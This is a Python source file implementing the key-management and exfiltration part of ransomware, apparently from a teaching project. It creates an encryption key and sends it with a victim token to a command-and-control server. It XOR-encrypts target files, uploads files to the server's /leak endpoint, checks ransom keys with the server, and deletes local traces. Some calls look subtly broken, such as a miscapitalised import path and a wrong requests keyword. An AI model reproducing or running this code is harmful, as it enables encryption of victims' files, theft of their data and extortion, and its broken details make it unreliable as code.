from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.KDF.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000 # Number of iteration for the key derivation function
    TOKEN_LENGTH = 16 # Length of the token
    SALT_LENGTH = 16 # Length of the salt
    KEY_LENGTH = 16 # Length of the key

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None: 
        self._remote_host_port = remote_host_port
        self._path = path # path to the malware
        self._key = None # key to decrypt files
        self._salt = None # salt to derive key
        self._token = None # token to identify the malware

        self._log = logging.getLogger(self.__class__.__name__) # logger


    def do_derivation(self, salt:bytes, key:bytes)->bytes: 
        # derive key from salt and key
        KDF = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,
            salt=salt,
            iterations=self.ITERATION,
        )
        return KDF.derive(key)

    def create(self)->Tuple[bytes, bytes, bytes]: # create crypto DATA
        salt = secrets.token_bytes(self.SALT_LENGTH)
        key = secrets.token_bytes(self.KEY_LENGTH)
        token = secrets.token_bytes(self.TOKEN_LENGTH)
        return salt, key, token


    def bin_to_b64(self, DATA:bytes)->str: # convert binary DATA to base64
        tmp = base64.b64encode(DATA)
        return str(tmp, "utf8")


    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        URL = f"http://{self._remote_host_port}/new"
        DATA = {
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key),
            "token": self.bin_to_b64(token),
        }
        self._log.info(f"POST {URL} {DATA}")
        r = requests.post(URL, DATA=DATA)
        self._log.info(f"POST {URL} {DATA} {r.status_code}")
        if r.status_code != 200:
            raise Exception("Error while registering to the CNC")

    def setup(self)->None: # main function to create crypto DATA and register malware to cnc
        salt, key, token = self.create() # create crypto DATA
        self.post_new(salt, key, token) # register to the CNC
        self._salt = salt # set the salt
        self._key = key # set the key
        self._token = token # set the token
        # save token in token.bin if not already present
        if not os.path.exists(os.path.join(self._path, "token.bin")): # if token.bin not present
            with open(os.path.join(self._path, "token.bin"),
                        "wb") as f:
                    f.write(token)
        with open(os.path.join(self._path, "salt.bin"), "wb") as f:
            f.write(salt)
            self._log.info("Setup done") # log


    def load(self)->None:
        # function to load crypto DATA from the target
        with open(os.path.join(self._path, "salt.bin"), "rb") as f:
            self._salt = f.read()
        with open(os.path.join(self._path, "token.bin"), "rb") as f:
            self._token = f.read()
        

    def check_key(self, candidate_key:bytes)->bool:
        # check if the candidate key is valid 
        URL = f"http://{self._remote_host_port}/check" # URL to check the key
        DATA = {
            "token": self.bin_to_b64(self._token),
            "key": self.bin_to_b64(candidate_key)
        }
        self._log.info(f"POST {URL} {DATA}") # log the request
        R = requests.post(URL, DATA=DATA)
        self._log.info(f"POST {URL} {DATA} {R.status_code}") # log the response
        if R.status_code != 200:
            return False
        return True


    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        key = base64.b64decode(b64_key)
        if self.check_key(key):
            self._key = key
            self._log.info("Key set")
        else:
            raise Exception("Invalid key")


    def get_hex_token(self)->str:
        # Return a string composed of hex symbole, regarding the token
        with open (os.path.join(self._path, "token.bin"), "rb") as f:
            token = f.read()
        return str(token.hex())


    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for f in files:
            xorfile(os.path.join(self._path, f), self._key)
           
         

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        for f in files:
            with open(os.path.join (self._path, f), "rb") as f:
                DATA = f.read()
            URL = f"http://{self._remote_host_port}/leak"
            DATA = {
                "token": self.bin_to_b64(self._token),
                "DATA": self.bin_to_b64(DATA),
                "filename": f
            }
            self._log.info(f"POST {URL} {DATA}")
            r = requests.post(URL, DATA=DATA)
            self._log.info(f"POST {URL} {DATA} {r.status_code}")
            if r.status_code != 200:
                raise Exception("Error while sending file to the CNC")

    def clean(self):# Mr propre
        # remove crypto DATA from the target
        os.remove(os.path.join(self._path, "salt.bin"))
        os.remove(os.path.join(self._path, "token.bin"))

    

    

    
